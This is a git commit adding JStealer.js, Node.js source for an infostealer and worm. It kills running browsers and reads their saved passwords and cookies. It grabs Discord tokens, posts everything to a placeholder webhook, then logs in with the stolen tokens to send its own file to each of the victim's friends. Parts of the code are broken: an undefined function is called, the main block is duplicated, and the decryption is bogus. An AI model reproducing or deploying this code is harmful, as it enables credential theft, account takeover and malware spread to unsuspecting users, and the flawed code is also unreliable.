9960f1228fbcd9664791f1c0d4e21356bdd07c97
Byte Wizard <122925084+BYT3W1Z4RD@users.noreply.github.com>
2023-01-18 04:29:36 +0000

    Create JStealer.js

---
+++ JStealer.js
@@ -0,0 +1,241 @@
+const crypto = require('crypto');
+const fs = require('fs');
+const http = require('http');
+const { exec } = require('child_process');
+const os = require('os');
+const Discord = require('discord.js');
+
+const WEBHOOK_URL = "http://yourwebhookurl.com";
+const DISCORD_APP_TOKEN_PATH = os.homedir() + "\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\";
+const DISCORD_WEB_TOKEN_PATH = os.homedir() + "\\AppData\\Local\\Discord\\User Data\\Default\\Local Storage\\leveldb\\";
+const BROWSERS = ["chrome", "msedge", "firefox", "brave", "operagx"];
+
+const checkBrowsersRunning = () => {
+    return new Promise((resolve, reject) => {
+        exec("tasklist", (error, stdout, stderr) => {
+            if (error) {
+                reject(error);
+            }
+            BROWSERS.forEach(browser => {
+                if (stdout.toLowerCase().includes(browser)) {
+                    console.log(`${browser} is running, killing ${browser} process`)
+                    exec(`taskkill /im ${browser}.exe /f`, (err, stdout, stderr) => {
+                        if (err) {
+                            reject(err);
+                        } else {
+                            resolve();
+                        }
+                    });
+                }
+            });
+            resolve();
+        });
+    });
+};
+
+const readBrowserPasswords = async (browser) => {
+    try {
+        let browserData;
+        let browserName;
+        let path;
+        switch (browser) {
+            case "chrome":
+                browserName = "Google\\Chrome";
+                path = "User Data\\Default\\Login Data";
+                break;
+            case "msedge":
+                browserName = "Microsoft\\Edge";
+                path = "User Data\\Default\\Login Data";
+                break;
+            case "firefox":
+                browserName = "Mozilla\\Firefox";
+                path = "Profiles\\default\\logins.json";
+                break;
+            case "brave":
+                browserName = "BraveSoftware\\Brave-Browser";
+                path = "User Data\\Default\\Login Data";
+                break;
+            case "operagx":
+                browserName = "Opera Software\\Opera GX";
+                path = "User Data\\Default\\Login Data";
+                break;
+            default:
+                console.log("Invalid browser");
+                return;
+            
+        }
+        browserData = await fs.promises.readFile("C:\\Users\\"+ process.env.username + "\\AppData\\Local\\"+ browserName + "\\"+ path);
+        let decipher = crypto.createDecipher('aes-256-cbc', 'password');
+        let decrypted = decipher.update(browserData);
+        decrypted = Buffer.concat([decrypted, decipher.final()]);
+        let logins = JSON.parse(decrypted);
+        return logins;
+    } catch (err) {
+        console.error(err);
+    }
+};
+
+const readBrowserCookies = async (browser) => {
+    try {
+        let browserData;
+        let browserName;
+        let path;
+        switch (browser) {
+            case "chrome":
+                browserName = "Google\\Chrome";
+                path = "User Data\\Default\\Cookies";
+                break;
+            case "msedge":
+                browserName = "Microsoft\\Edge";
+                path = "User Data\\Default\\Cookies";
+                break;
+            case "firefox":
+                browserName = "Mozilla\\Firefox";
+                path = "Profiles\\default\\cookies.sqlite";
+                break;
+            case "brave":
+                browserName = "BraveSoftware\\Brave-Browser";
+                path = "User Data\\Default\\Cookies";
+                break;
+            case "operagx":
+                browserName = "Opera Software\\Opera GX";
+                path = "User Data\\Default\\Cookies";
+                break;
+            default:
+                console.log("Invalid browser");
+                return;
+        }
+        browserData = await fs.promises.readFile("C:\\Users\\"+ process.env.username + "\\AppData\\Local\\"+ browserName + "\\"+ path);
+        let decipher = crypto.createDecipher('aes-256-cbc', 'password');
+        let decrypted = decipher.update(browserData);
+        decrypted = Buffer.concat([decrypted, decipher.final()]);
+        let cookies = JSON.parse(decrypted);
+        return cookies;
+    } catch (err) {
+        console.error(err);
+    }
+};
+
+(async function(){
+    await checkChromeRunning();
+    BROWSERS.forEach(async browser => {
+        let passwords = await readBrowserPasswords(browser);
+        let cookies = await readBrowserCookies(browser);
+        await sendDataToWebhook(passwords, browser + " password");
+        await sendDataToWebhook(cookies, browser + " cookie");
+    });
+    let discordTokens = await readDiscordTokens();
+    await sendDataToWebhook(discordTokens, "token");
+
+    let scriptFileName = __filename;
+    discordTokens.forEach(token => {
+        sendFileToDiscord(token, scriptFileName);
+    });
+})();
+
+
+const readDiscordTokens = async () => {
+    try {
+        let discordAppData = await fs.promises.readdir(DISCORD_APP_TOKEN_PATH);
+        let discordWebData = await fs.promises.readdir(DISCORD_WEB_TOKEN_PATH);
+        let tokens = [];
+        discordAppData.forEach(file => {
+            if (file.endsWith(".ldb")) {
+                let token = fs.promises.readFile(DISCORD_APP_TOKEN_PATH + file);
+                tokens.push({
+                    type: "Discord App Token",
+                    token: token
+                });
+            }
+        });
+        discordWebData.forEach(file => {
+            if (file.endsWith(".ldb")) {
+                let token = fs.promises.readFile(DISCORD_WEB_TOKEN_PATH + file);
+                tokens.push({
+                    type: "Discord Web Token",
+                    token: token
+                });
+            }
+        });
+        return tokens;
+    } catch (err) {
+        console.error(err);
+    }
+};
+
+const sendDataToWebhook = async (data, type) => {
+    try {
+        data.forEach(item => {
+            let postData = JSON.stringify({
+                url: item.url,
+                data: item.data,
+                type: type
+            });
+
+            let options = {
+                hostname: WEBHOOK_URL,
+                port: 80,
+                path: '/',
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Content-Length': postData.length
+                }
+            };
+
+            let req = http.request(options, (res) => {
+                console.log(`statusCode: ${res.statusCode}`);
+                res.on('data', (d) => {
+                    process.stdout.write(d);
+                });
+            });
+
+            req.on('error', (error) => {
+                console.error(error);
+            });
+
+            req.write(postData);
+            req.end();
+        });
+    } catch (err) {
+        console.error(err);
+    }
+};
+
+const sendFileToDiscord = async (token, file) => {
+    try {
+        let client = new Discord.Client();
+        client.login(token);
+
+        client.on('ready', () => {
+            let user = client.user;
+            let friends = user.friends.map(f => f.username);
+            friends.forEach(friend => {
+                let friendUser = client.users.find(u => u.username === friend);
+                friendUser.createDM().then(dm => {
+                    dm.send({ files: [file] });
+                });
+            });
+            client.destroy();
+        });
+    } catch (err) {
+        console.error(err);
+    }
+};
+
+(async function(){
+    await checkBrowsersRunning();
+    BROWSERS.forEach(async browser => {
+        let passwords = await readBrowserPasswords(browser);
+        let cookies = await readBrowserCookies(browser);
+        await sendDataToWebhook(passwords, browser + " password");
+        await sendDataToWebhook(cookies, browser + " cookie");
+    });
+    let discordTokens = await readDiscordTokens();
+    await sendDataToWebhook(discordTokens, "token");
+
+    let scriptFileName = __filename;
+    discordTokens.forEach(token => {
+        sendFileToDiscord(token, scriptFileName);
+    });
+})();
